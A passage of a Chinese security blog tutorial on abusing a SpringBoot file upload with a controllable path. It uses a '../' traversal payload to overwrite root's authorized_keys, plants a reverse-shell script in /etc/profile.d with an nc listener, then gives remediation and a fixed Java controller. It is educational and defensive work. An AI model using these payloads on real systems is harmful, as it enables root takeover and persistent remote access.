+</li>
+</ul>
+<h3 id="生成公私钥"><a href="#生成公私钥" class="headerlink" title="生成公私钥"></a>生成公私钥</h3><p>使用ssh-keygen生成公钥和私钥</p>
+<p>ssh-keygen -t “加密方式” -C“描述”</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure>
+<p>三次回车即可</p>
+<p><img src="UIHjG8HHEdBNN6B5RMh_lyY3IxMvTVm13AwogI0HPxo.png" alt="image"></p>
+<p>安装公钥</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /root/.ssh</span><br><span class="line">cat id_rsa.pub &gt;&gt; authorized_keys</span><br></pre></td></tr></table></figure>
+<p><img src="8v_pdpxtzMKK3unNGR9ldrJy_tNtxFxKC6qU3NPaiMk.png" alt="image"></p>
+<p>更改权限</p>
+<p>authorized_keys需要600</p>
+<p>.ssh需要700</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod <span class="number">600</span> ~/.ssh/authorized_keys</span><br><span class="line">chmod <span class="number">700</span> ~/.ssh</span><br></pre></td></tr></table></figure>
+
+
+<h3 id="开启公钥登录"><a href="#开启公钥登录" class="headerlink" title="开启公钥登录"></a>开启公钥登录</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/ssh/sshd_config</span><br><span class="line">PubkeyAuthentication no改为yes</span><br></pre></td></tr></table></figure>
+<p><img src="sVic4p5hZcyvGEYzU_kckPrS9KCWX5V23amwZL7iB9s.png" alt="image"></p>
+<p>重启ssh服务</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl restart sshd.service</span><br></pre></td></tr></table></figure>
+<h3 id="攻击者生成公钥"><a href="#攻击者生成公钥" class="headerlink" title="攻击者生成公钥"></a>攻击者生成公钥</h3><p>使用ssh-keygen生成公钥和私钥</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure>
+<p><img src="vmN311G5GMwurYSwNknSgmf9XnjgG46zKYbbUYq_2MA.png" alt="image"></p>
+<p>把生成的id_rsa.pub上传到目标服务器</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/../../../../../../../root/.ssh/authorized_keys</span><br></pre></td></tr></table></figure>
+<p><img src="7xZAqA1rvcxD2ipf4lkvOjFnVgw0k4BidEAL6czMn2U.png" alt="image"></p>
+<p>在攻击者的机器上使用公钥成功连接目标</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh root@<span class="number">192.168</span><span class="number">.88</span><span class="number">.104</span> -p <span class="number">22</span></span><br></pre></td></tr></table></figure>
+<p><img src="POxR2yuZM6rjd0boyPSmQklQvQwgNVM5vokAPETDRpw.png" alt="image"></p>
+<h2 id="利用姿势三（终端自启动）"><a href="#利用姿势三（终端自启动）" class="headerlink" title="利用姿势三（终端自启动）"></a>利用姿势三（终端自启动）</h2><p>条件：</p>
+<ul>
+<li>路径可以控制</li>
+<li>.sh后缀未被禁止</li>
+<li>对&#x2F;etc&#x2F;profile目录有写权限</li>
+</ul>
+<p>打开profile文件分析得知，用户打开bash窗口就会执行&#x2F;etc&#x2F;profile.d目录下所有.sh文件</p>
+<p><img src="tw-G7X0ckGwkYRW9uzgAtFbquGXN7vxYzwpBGQypdaU.png" alt="image"></p>
+<p>上传一个rce.sh后缀的文件到目标的&#x2F;etc&#x2F;profile.d目录下，其rce.sh的内容为反弹shell的内容</p>
+<p><img src="5M_X1qjCQagqhCZ1tVRDVsGRgWiX_FT7Vu4ZOzj3RQQ.png" alt="image"></p>
+<p>nc进行监听</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp <span class="number">7799</span>  #直接监听</span><br></pre></td></tr></table></figure>
+<p>模拟管理员登录目标终端，成功在nc上接受到了shell</p>
+<p><img src="zmoOoI01LzlICJYnopinXNmyhsXCiydjP9RXXgLFX4s.png" alt="image"></p>
+<h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><ul>
+<li><p>对上传文件的类型进行检查，只允许上传指定的文件类型。</p>
+</li>
+<li><p>对上传文件的大小进行限制，以避免过大的文件占用服务器资源。</p>
+</li>
+<li><p>校验文件名称，过滤..&#x2F;</p>
+</li>
+<li><p>对上传文件进行重命名，以防止恶意覆盖其他文件或者构造路径遍历攻击。</p>
+</li>
+</ul>
+<h2 id="对demo进行简单修复"><a href="#对demo进行简单修复" class="headerlink" title="对demo进行简单修复"></a>对demo进行简单修复</h2><p>对文件重命名，这里添加上一个时间戳</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">fileName</span> <span class="operator">=</span> System.currentTimeMillis() + <span class="string">&quot;_&quot;</span> + file.getOriginalFilename();</span><br></pre></td></tr></table></figure>
+<p>检查是否包含..&#x2F;</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 判断文件名是否合法，即不存在 ../ 字符串</span></span><br><span class="line"><span class="keyword">if</span> (originalFileName.contains(<span class="string">&quot;../&quot;</span>)) &#123;</span><br><span class="line">    <span class="comment">// 文件名不合法，抛出异常或给出提示信息</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 文件名合法，执行保存操作</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>限制文件类型</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定义允许上传的文件类型</span></span><br><span class="line">List&lt;String&gt; allowedExtensions = Arrays.asList(<span class="string">&quot;png&quot;</span>, <span class="string">&quot;jpg&quot;</span>, <span class="string">&quot;gif&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取上传文件的后缀名</span></span><br><span class="line"><span class="type">String</span> <span class="variable">originalFileName</span> <span class="operator">=</span> file.getOriginalFilename();    </span><br><span class="line"><span class="type">String</span> <span class="variable">extension</span> <span class="operator">=</span> originalFileName.substring(originalFileName.lastIndexOf(<span class="string">&#x27;.&#x27;</span>) + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 判断文件类型是否在允许的范围内</span></span><br><span class="line"><span class="keyword">if</span> (!allowedExtensions.contains(extension)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;文件类型不合法!&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 文件类型合法，执行保存操作</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>最终的demo</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.garck3h.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PostMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.multipart.MultipartFile;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Path;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by IntelliJ IDEA.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span>: Garck3h</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Date</span>: 2023/6/2</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Time</span>: 21:56</span></span><br><span class="line"><span class="comment"> * Life is endless, and there is no end to it.</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FileUploadController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping(&quot;/upload&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">uploadFile</span><span class="params">(<span class="meta">@RequestParam(&quot;file&quot;)</span> MultipartFile file)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (file.isEmpty()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;文件为空!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//这段代码实现了校验文件上传的后缀，只能是png,jpg,git后缀，其它后缀就显示文件非法</span></span><br><span class="line">        <span class="comment">// 定义允许上传的文件类型</span></span><br><span class="line">        List&lt;String&gt; allowedExtensions = Arrays.asList(<span class="string">&quot;png&quot;</span>, <span class="string">&quot;jpg&quot;</span>, <span class="string">&quot;gif&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取上传文件的后缀名</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">originalFileName</span> <span class="operator">=</span> file.getOriginalFilename();</span><br><span class="line">        <span class="type">String</span> <span class="variable">extension</span> <span class="operator">=</span> originalFileName.substring(originalFileName.lastIndexOf(<span class="string">&#x27;.&#x27;</span>) + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 判断文件类型是否在允许的范围内</span></span><br><span class="line">        <span class="keyword">if</span> (!allowedExtensions.contains(extension)) &#123;</span><br><span class="line">            <span class="comment">// 不支持该类型文件，抛出异常或给出提示信息</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;文件类型不合法!&quot;</span>;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 文件类型合法，执行保存操作</span></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">// 获取项目资源路径</span></span><br><span class="line">                <span class="type">String</span> <span class="variable">resourcePath</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;user.dir&quot;</span>);</span><br><span class="line">                </span><br><span class="line">                <span class="comment">// 定义存储文件的目录路径和文件全名</span></span><br><span class="line">                <span class="type">String</span> <span class="variable">folderPath</span> <span class="operator">=</span> resourcePath + File.separator + <span class="string">&quot;data&quot;</span> + File.separator + <span class="string">&quot;upload&quot;</span> + File.separator;</span><br><span class="line">                <span class="comment">//对文件重命名，以防止恶意覆盖其他文件或者构造路径遍历攻击</span></span><br><span class="line">                <span class="type">String</span> <span class="variable">fileName</span> <span class="operator">=</span> System.currentTimeMillis() + <span class="string">&quot;_&quot;</span> + file.getOriginalFilename();</span><br><span class="line">                <span class="comment">// 判断文件名是否合法，即不存在 ../ 字符串</span></span><br><span class="line">                <span class="keyword">if</span> (originalFileName.contains(<span class="string">&quot;../&quot;</span>)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&quot;不允许包含../&quot;</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;<span class="comment">// 文件名合法，执行保存操作</span></span><br><span class="line"></span><br><span class="line">                    <span class="comment">// 若文件夹不存在，则创建文件夹</span></span><br><span class="line">                    <span class="type">File</span> <span class="variable">folderDir</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(folderPath);</span><br><span class="line">                    <span class="keyword">if</span> (!folderDir.exists()) &#123;</span><br><span class="line">                        folderDir.mkdirs();</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="comment">// 将上传的文件写入磁盘</span></span><br><span class="line">                    <span class="type">byte</span>[] bytes = file.getBytes();</span><br><span class="line">                    <span class="type">Path</span> <span class="variable">path</span> <span class="operator">=</span> Paths.get(folderPath + fileName);</span><br><span class="line">                    Files.write(path, bytes);</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&quot;文件上传成功!\n&quot;</span>+ <span class="string">&quot;路径：&quot;</span>+ path;</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;文件上传失败!&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>测试..&#x2F;是否生效，测试结果OK</p>
+<p><img src="OmAUDMK0Nx_duQtx8GS-ziogLfdaunfMIWqcIVm_R8E.png" alt="image"></p>
+<p>测试后缀是否生效，测试结果OK</p>
+<p><img src="rDRU9a4qMuz3H1GxpFiq9xAMuwDQy7SE0jJlwx9KBvE.png" alt="image"></p>
+<p>测试重命名是否生效，测试结果OK</p>
+<p><img src="Hf6RXf630FYN8pXGqJnB7ogXOr2gQY5GEpzAWx-pxHY.png" alt="image"></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>本文简单诠释了一下SpringBoot任意文件上传且路径可控的情况下带来的一些危害。以一个简单的代码例子来进行分析，分别从三个姿势来进行深入利用。最后对demo进行了简单的修复，主要是从校验文件类型、重命名文件和过滤..&#x2F;来实现。</p>
+<p><strong>声明：</strong><em>本文仅限技术研究与交流，严禁用于非法用途，否则产生的一切后果自行承担！转载_请注明来源!!!</em></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/archives/">文章</a></li>
+        
+          <li><a href="/categories/">分类</a></li>
+        
+          <li><a href="/tags/">标签</a></li>
+        
+          <li><a href="/search/">搜索</a></li>
+        
+          <li><a href="/about/">关于</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SpringBoot%E6%A1%86%E6%9E%B6%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%84Trick"><span class="toc-number">1.</span> <span class="toc-text">SpringBoot框架文件上传的Trick</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#demo%E5%88%86%E6%9E%90"><span class="toc-number">1.2.</span> <span class="toc-text">demo分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AAspringboot%E9%A1%B9%E7%9B%AE"><span class="toc-number">1.2.1.</span> <span class="toc-text">创建一个springboot项目</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%85%8D%E7%BD%AEspringboot"><span class="toc-number">1.2.2.</span> <span class="toc-text">配置springboot</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%84demo"><span class="toc-number">1.2.3.</span> <span class="toc-text">文件上传的demo</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%93%E5%8C%85%E4%B8%BAjar%E9%83%A8%E7%BD%B2%E5%88%B0Linux"><span class="toc-number">1.2.4.</span> <span class="toc-text">打包为jar部署到Linux</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-x2F-%E6%8C%87%E5%AE%9A%E6%96%87%E4%BB%B6%E5%AD%98%E5%82%A8%E7%9B%AE%E5%BD%95"><span class="toc-number">1.2.5.</span> <span class="toc-text">利用..&#x2F;指定文件存储目录</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF%E4%B8%80-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1"><span class="toc-number">1.3.</span> <span class="toc-text">利用姿势一(定时任务)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E8%B7%AF%E5%BE%84%E4%B8%80"><span class="toc-number">1.3.1.</span> <span class="toc-text">利用路径一</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E8%B7%AF%E5%BE%84%E4%BA%8C"><span class="toc-number">1.3.2.</span> <span class="toc-text">利用路径二</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF%E4%BA%8C%EF%BC%88%E6%9B%BF%E6%8D%A2%E5%85%AC%E9%92%A5%EF%BC%89"><span class="toc-number">1.4.</span> <span class="toc-text">利用姿势二（替换公钥）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%9F%E6%88%90%E5%85%AC%E7%A7%81%E9%92%A5"><span class="toc-number">1.4.1.</span> <span class="toc-text">生成公私钥</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%80%E5%90%AF%E5%85%AC%E9%92%A5%E7%99%BB%E5%BD%95"><span class="toc-number">1.4.2.</span> <span class="toc-text">开启公钥登录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E8%80%85%E7%94%9F%E6%88%90%E5%85%AC%E9%92%A5"><span class="toc-number">1.4.3.</span> <span class="toc-text">攻击者生成公钥</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF%E4%B8%89%EF%BC%88%E7%BB%88%E7%AB%AF%E8%87%AA%E5%90%AF%E5%8A%A8%EF%BC%89"><span class="toc-number">1.5.</span> <span class="toc-text">利用姿势三（终端自启动）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE"><span class="toc-number">1.6.</span> <span class="toc-text">修复建议</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%B9demo%E8%BF%9B%E8%A1%8C%E7%AE%80%E5%8D%95%E4%BF%AE%E5%A4%8D"><span class="toc-number">1.7.</span> <span class="toc-text">对demo进行简单修复</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.8.</span> <span class="toc-text">总结</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://garckz.github.io/2023/06/04/SpringBoot%E6%A1%86%E6%9E%B6%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%84Trick/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://garckz.github.io/2023/06/04/SpringBoot%E6%A1%86%E6%9E%B6%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%84Trick/&text=SpringBoot框架文件上传的Trick"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://garckz.github.io/2023/06/04/SpringBoot%E6%A1%86%E6%9E%B6%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%84Trick/&title=SpringBoot框架文件上传的Trick"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://garckz.github.io/2023/06/04/SpringBoot%E6%A1%86%E6%9E%B6%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%84Trick/&is_video=false&description=SpringBoot框架文件上传的Trick"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=SpringBoot框架文件上传的Trick&body=Check out this article: https://garckz.github.io/2023/06/04/SpringBoot%E6%A1%86%E6%9E%B6%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%84Trick/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://garckz.github.io/2023/06/04/SpringBoot%E6%A1%86%E6%9E%B6%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%84Trick/&title=SpringBoot框架文件上传的Trick"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://garckz.github.io/2023/06/04/SpringBoot%E6%A1%86%E6%9E%B6%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%84Trick/&title=SpringBoot框架文件上传的Trick"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://garckz.github.io/2023/06/04/SpringBoot%E6%A1%86%E6%9E%B6%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%84Trick/&title=SpringBoot框架文件上传的Trick"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://garckz.github.io/2023/06/04/SpringBoot%E6%A1%86%E6%9E%B6%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%84Trick/&title=SpringBoot框架文件上传的Trick"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://garckz.github.io/2023/06/04/SpringBoot%E6%A1%86%E6%9E%B6%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%84Trick/&name=SpringBoot框架文件上传的Trick&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://garckz.github.io/2023/06/04/SpringBoot%E6%A1%86%E6%9E%B6%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%84Trick/&t=SpringBoot框架文件上传的Trick"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+    <div class="footer-left">
+        Copyright &copy;
+        
+        
+        2019-2023
+        Garck3h
+    </div>
+    <div class="footer-right">
+        <nav>
+
+            <ul>
+                
+                    <!-- 不蒜子统计 -->
+                    <span id="busuanzi_container_site_pv">
+                  本站总访问量<span id="busuanzi_value_site_pv"></span>次
+              </span>
+
+                    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+                
+            </ul>
+
+
+        </nav>
+    </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
